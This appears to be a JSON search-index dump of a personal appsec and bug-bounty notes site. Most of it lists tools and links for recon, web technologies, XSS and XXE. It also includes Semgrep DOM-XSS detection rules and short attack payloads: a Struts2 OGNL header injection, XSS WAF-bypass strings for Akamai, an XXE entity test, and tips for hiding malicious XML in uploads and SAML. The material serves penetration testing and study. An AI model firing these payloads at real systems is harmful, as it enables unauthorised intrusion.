https://tutorialboy24.blogspot.com/2022/02/introduction-to-spring-boot-related.html Actuators Spring RCE APL Symphony https://book.hacktricks.xyz/pentesting/pentesting-web/symphony Swagger https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/#newsletter https://github.com/seanmarpo/springfox-swagger-xss https://github.com/amalmurali47/swagroutes Telerik Web UI https://captmeelo.com/pentest/2018/08/03/pwning-with-telerik.html Tomcat Check for WEB-INF/web.xml WebDAV Methods PROPPATCH, PROPFIND and LOCK accept XML input https://dhiyaneshgeek.github.io/web/security/2021/02/19/exploiting-out-of-band-xxe/ WebLogic https://pyn3rd.github.io/2022/06/18/Weblogic-SSRF-Involving-Deserialized-JDBC-Connection/ ","description":"Adobe AEM aem-hacker aemscan aem-paths.txt writeup about aem exploitation Adobe Coldfusion https://www.jomar.fr/posts/2021/basic_recon_to_rce/ API API-Security-Checklist api-testing-checklist API Security 31-days-of-API-Security-Tips awesome-api-security web-api-pentesting OpenAPI Scanner General tips Mindmap Apache Exploit default apache Apache Struts2 Endpoints with .action, .do, .go are all using struts2 Content-Type: %{#context[\u0026#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse\u0026#39;].addHeader(\u0026#39;Added Header\u0026#39;,4*4)}.multipart/form-data Artifactory Hacking Artifactory Hacking guide ASP.NET/IIS ASPX and ASP.net have viewstate in cookie values, default ASP has not exploiting-viewstate viewgen shortname scanner XSS trace.axd any.aspx/trace.axd WEB-INF/web.xml con/ aux/ con."},{"id":67,"href":"/resources/webtools/","title":"Web Tools","parent":"Resources","content":" Website Description https://www.utf8-chartable.de/ UTF-8 Table https://grep.app/ Grep over multiple github repositories https://publicwww.com/ Grep over multiple websites source codes https://www.degraeve.com/reference/urlencoding.php List of URL encoded characters https://api-guesser.netlify.app/ Input an api key and the script will return from where it belongs https://gchq.github.io/CyberChef/ For all purposes https://securityheaders.com/ Test sites for security headers https://builtwith.com Database of sites technologies https://deps.dev/ Open Source Insights ","description":" Website Description https://www.utf8-chartable.de/ UTF-8 Table https://grep.app/ Grep over multiple github repositories https://publicwww.com/ Grep over multiple websites source codes https://www.degraeve.com/reference/urlencoding.php List of URL encoded characters https://api-guesser.netlify.app/ Input an api key and the script will return from where it belongs https://gchq.github.io/CyberChef/ For all purposes https://securityheaders.com/ Test sites for security headers https://builtwith.com Database of sites technologies https://deps.dev/ Open Source Insights "},{"id":68,"href":"/","title":"Welcome to caon.io","parent":"","content":"This site contains mostly stuff about appsec that may be helpful for read teamers or bug bounty hunters out there.\nEverything written in here and in the following pages was acquired by reading articles, books, watching videos and talks. None of this is exclusive, if you want to copy, feel free.\nThe basics Hacking is like building a house, you need to construct a foundation before making the roof.\nDev Hints Learn Regex The first rule Security Checklist The Six Dumbest Ideas OWASP TOP10 Blue Team Blue Teaming Let\u0026rsquo;s Defend Newsletter Sources to keep you informed about sec world\nhttps://tldrsec.com/ https://danielmiessler.com/newsletter/ https://securib.ee/newsletter/ CVE POC\u0026rsquo;s https://github.com/cckuailong/reapoc https://github.com/trickest/cve ","description":"This site contains mostly stuff about appsec that may be helpful for read teamers or bug bounty hunters out there.\nEverything written in here and in the following pages was acquired by reading articles, books, watching videos and talks. None of this is exclusive, if you want to copy, feel free.\nThe basics Hacking is like building a house, you need to construct a foundation before making the roof.\nDev Hints Learn Regex The first rule Security Checklist The Six Dumbest Ideas OWASP TOP10 Blue Team Blue Teaming Let\u0026rsquo;s Defend Newsletter Sources to keep you informed about sec world"},{"id":69,"href":"/recon/whois/","title":"Whois","parent":"Recons","content":" Whois https://www.whatsmydns.net/domain-name-owner Reverse Whois https://tools.whoisxmlapi.com/reverse-whois-search Whois History https://www.whoxy.com Whois mass checking: https://github.com/melbadry9/WhoEnum ","description":" Whois https://www.whatsmydns.net/domain-name-owner Reverse Whois https://tools.whoisxmlapi.com/reverse-whois-search Whois History https://www.whoxy.com Whois mass checking: https://github.com/melbadry9/WhoEnum "},{"id":70,"href":"/exploitation/vulnerability/xss/","title":"XSS","parent":"Exploitations","content":"# https://github.com/hahwul/dalfox dalfox url http://example.com cat urls | dalfox pipe - --skip-bav --skip-mining-all Find reflected parameters that could lead to XSS with Gxss\n# https://github.com/KathanP19/Gxss cat list | Gxss -c 100 -p REPLACE_STRING Semgrep Semgrep can be used to detect sink and sources and assist in XSS detection.\nUsage Download javascript files and beautify them (See Javascript), then run semgrep with\nsemgrep -c xss.yaml scripts/* Hold down!\nJavascript files must be beautified, otherwise semgrep will no work properly.\nrules: - id: domxss-insertAdjacentHTML languages: - javascript - typescript message: Found dangerous HTML output pattern-either: - pattern: document.location.search = ... - pattern: document.location.hash = ... - pattern: document.location.pathname = ... - pattern: window.location.search = ... - pattern: window.location.hash = ... - pattern: window.location.pathname = ... - pattern: document.URL = ... - pattern: document.documentURI = ... - pattern: document.baseURI = ... - pattern: document.cookie = ... - pattern: document.referrer = ... - pattern: $X.insertAdjacentHTML(...) - pattern: $X.innerHTML(...) - pattern: $X.innerHTML = ... - pattern: eval(...) - pattern: execScript - pattern: script.src = ... - pattern: iframe.src = ... - pattern: document.location = ... - pattern: window.location = ... - pattern: document.location.href = ... - pattern: window.location.href = ... - pattern: document.write(...) - pattern: document.writeln(...) - pattern: $X.outerHTML = ... - pattern: $X.outerHTML(...) severity: WARNING rules: - id: domxss-insertAdjacentHTML languages: - javascript - typescript message: Found dangerous HTML output mode: taint pattern-sources: - pattern: document.location.search - pattern: document.location.hash - pattern: document.location.pathname - pattern: document.location.href - pattern: document.location - pattern: window.location - pattern: window.location.href - pattern: window.location.search - pattern: window.location.hash - pattern: window.location.pathname - pattern: document.URL - pattern: document.documentURI - pattern: document.baseURI - pattern: document.cookie - pattern: document.referrer pattern-sinks: - pattern: $X.insertAdjacentHTML(...) - pattern: $X.innerHTML(...) - pattern: $X.innerHTML = ... - pattern: eval(...) - pattern: execScript - pattern: script.src = ... - pattern: iframe.src = ... - pattern: document.location = ... - pattern: window.location = ... - pattern: document.location.href = ... - pattern: window.location.href = ... - pattern: document.write(...) - pattern: document.writeln(...) - pattern: $X.outerHTML = ... - pattern: $X.outerHTML(...) severity: WARNING Markdown Markdown parsers can lead to XSS\nhttps://swarm.ptsecurity.com/fuzzing-for-xss-via-nested-parsers-condition/ Bypass Try to encode characters with unicode to achieve WAF bypass\nalert(1) would become ale\\u{72}t(1\\x29, where\n\\u{72} is unicode to r \\x29 is unicode to )\nAkamai Bypass Sometimes works:\n\u0026#34;\u0026gt;\u0026lt;a/\\test=\u0026#34;%26quot\u0026#34;href=%27javascript:/**/;\\ale\\u{72}t(11111\\x29\u0026#34;);%27\u0026gt;Click \u0026#34;\u0026gt;\u0026lt;a/\\test=\u0026#34;%26quot;x%26quot;\u0026#34;href=%27javascript:/**/;location.assign(\u0026#34;google.com\u0026#34;)%27\u0026gt;Click\u0026lt;/a\u0026gt; Cool resources URL Description https://xss.pwnfunction.com/ pwnfunction XSS game https://github.com/s0md3v/MyPapers/tree/master/Bypassing-XSS-detection-mechanisms Bypass Mechanisms https://htmlparse.hackaplaneten.se/ Parser Issues ","description":"# https://github.com/hahwul/dalfox dalfox url http://example.com cat urls | dalfox pipe - --skip-bav --skip-mining-all Find reflected parameters that could lead to XSS with Gxss\n# https://github.com/KathanP19/Gxss cat list | Gxss -c 100 -p REPLACE_STRING Semgrep Semgrep can be used to detect sink and sources and assist in XSS detection.\nUsage Download javascript files and beautify them (See Javascript), then run semgrep with\nsemgrep -c xss.yaml scripts/* Hold down!\nJavascript files must be beautified, otherwise semgrep will no work properly."},{"id":71,"href":"/exploitation/vulnerability/xxe/","title":"XXE","parent":"Exploitations","content":"Detection:\n# Content type \u0026#34;application/json\u0026#34; or \u0026#34;application/x-www-form-urlencoded\u0026#34; to \u0026#34;applcation/xml\u0026#34;. # File Uploads allows for docx/xlsx/pdf/zip, unzip the package and add your evil xml code into the xml files. # If svg allowed in picture upload, you can inject xml in svgs. # If the web app offers RSS feeds, add your malicious code into the RSS. # Fuzz for /soap api, some applications still running soap apis # If the target web app allows for SSO integration, you can inject your milicious xml code in the SAML request/reponse Check:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE a [\u0026lt;!ENTITY test \u0026#34;THIS IS A STRING!\u0026#34;\u0026gt;]\u0026gt; \u0026lt;methodCall\u0026gt;\u0026lt;methodName\u0026gt;\u0026amp;test;\u0026lt;/methodName\u0026gt;\u0026lt;/methodCall\u0026gt; URL Description https://github.com/payloadbox/xxe-injection-payload-list Payloads https://gist.github.com/staaldraad/01415b990939494879b4 Payloads https://pentestbook.six2dez.com/enumeration/web/xxe XXE info ","description":"Detection:\n# Content type \u0026#34;application/json\u0026#34; or \u0026#34;application/x-www-form-urlencoded\u0026#34; to \u0026#34;applcation/xml\u0026#34;. # File Uploads allows for docx/xlsx/pdf/zip, unzip the package and add your evil xml code into the xml files. # If svg allowed in picture upload, you can inject xml in svgs. # If the web app offers RSS feeds, add your malicious code into the RSS. # Fuzz for /soap api, some applications still running soap apis # If the target web app allows for SSO integration, you can inject your milicious xml code in the SAML request/reponse Check:"},{"id":72,"href":"/resources/youtubechannels/","title":"Youtube Channels","parent":"Resources","content":" Name Channel Ippsec https://www.youtube.com/c/ippsec Reconless https://www.youtube.com/channel/UCCp25j1Zh9vc_WFm-nB9fhQ ","description":" Name Channel Ippsec https://www.youtube.com/c/ippsec Reconless https://www.youtube.com/channel/UCCp25j1Zh9vc_WFm-nB9fhQ "}]